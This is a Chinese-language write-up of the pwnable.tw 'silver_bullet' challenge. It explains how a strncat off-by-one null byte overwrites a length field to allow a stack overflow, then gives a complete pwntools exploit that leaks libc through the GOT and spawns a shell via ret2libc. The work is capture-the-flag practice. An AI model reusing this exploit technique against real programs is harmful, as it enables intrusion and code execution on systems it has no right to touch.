# pwnable.tw silver_bullet

### 0x0 前置补偿

### 0x1 分析

看一下安全性：

```shell
[*] './silver_bullet'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

没有开CANARY，地址也是固定的。

程序逻辑很简单，一个菜单程序。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int idx; // eax
  int v5; // [esp+0h] [ebp-3Ch]
  const char *v6; // [esp+4h] [ebp-38h]
  char s; // [esp+8h] [ebp-34h]
  int len; // [esp+38h] [ebp-4h]

  init_proc();
  len = 0;
  memset(&s, 0, 0x30u);
  v5 = 0x7FFFFFFF;
  v6 = "Gin";
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          idx = read_int();
          if ( idx != 2 )
            break;
          power_up(&s);                         // idx 2
        }
        if ( idx > 2 )
          break;
        if ( idx != 1 )
          goto LABEL_16;
        create_bullet(&s);                      // idx 1
      }
      if ( idx == 3 )
        break;
      if ( idx == 4 )                           // idx 4
      {
        puts("Don't give up !");
        exit(0);
      }
LABEL_16:
      puts("Invalid choice");
    }
    if ( beat((int)&s, &v5) )                   // idx 3
      return 0;
    puts("Give me more power !!");
  }
}
```

`create_bullet()`在`main`的局部变量`s`内写入数据，并记录长度`len`

`power_up()`在`s`的后面追加数据，并更新长度`len`

很明显的联想到`ret2libc`。

但是由于这两个函数在输入数据都限制了长度，没办法栈溢出。

注意一下`power_up()`函数

```c
int __cdecl power_up(char *dest)
{
  char s; // [esp+0h] [ebp-34h]
  size_t v3; // [esp+30h] [ebp-4h]

  v3 = 0;
  memset(&s, 0, 0x30u);
  if ( !*dest )
    return puts("You need create the bullet first !");
  if ( *((_DWORD *)dest + 0xC) > 0x2Fu )
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input(&s, 0x30 - *((_DWORD *)dest + 0xC));
  strncat(dest, &s, 0x30 - *((_DWORD *)dest + 0xC));
  v3 = strlen(&s) + *((_DWORD *)dest + 0xC);
  printf("Your new power is : %u\n", v3);
  *((_DWORD *)dest + 0xC) = v3;
  return puts("Enjoy it !");
}
```

这里检测长度使用的`len`。也就是说覆盖了这里就可以任意栈溢出了。

注意到`strncat()`函数，可以在最后追加一个`\0` 就可以覆盖到`len`了。也就可以栈溢出了。

但是想要退出`main`函数来`ret2libc`不能用`exit(0)`，需要`return 0`。也就是要在`beat()`完成相应操作，也就需要覆盖后`len > 0x7FFFFFFF`。

#### 漏洞利用

1. leak libc
2. getshell

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'i386' , os = 'linux', log_level='debug')

# p = process('./silver_bullet')
p = remote('chall.pwnable.tw', 10103)
elf = ELF('./silver_bullet')
libc = ELF('./libc_32.so.6')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')

def debug(p, cmd):
    gdb.attach(p, cmd)
    pause()

def add(content):
    p.sendlineafter('Your choice :', '1')
    p.sendafter('Give me your description of bullet :', content)

def edit(content):
    p.sendlineafter('Your choice :', '2')
    p.sendafter('Give me your another description of bullet :', content)

def beat():
    p.sendlineafter('Your choice :', '3')

def bye():
    p.sendlineafter('Your choice :', '4')

# leak libc
add('a'*47 + '\n')
edit('a')
payload = '\xff' * 0x3 + p32(0xdeadbeaf) + p32(elf.plt['puts']) + p32(0x08048954) + p32(elf.got['puts'])
edit(payload)
beat()
p.recvuntil("Oh ! You win !!\n")
puts_addr = u32(p.recv(4))
libc_base = puts_addr - libc.symbols['puts']
libc.address = libc_base
system_addr = libc.sym['system']
sh_addr = next(libc.search('/bin/sh'))
print ('libc: ', hex(libc_base))
print ('system: ', hex(system_addr))
print ('sh: ', hex(sh_addr))
# debug(p, '\n')
pause()

# get shell
add('a'*47 + '\n')
edit('a')
payload = '\xff' * 0x3 + p32(0xdeadbeaf) + p32(system_addr) + p32(0xdeadbeaf) + p32(sh_addr)
edit(payload)
beat()
p.interactive()
```

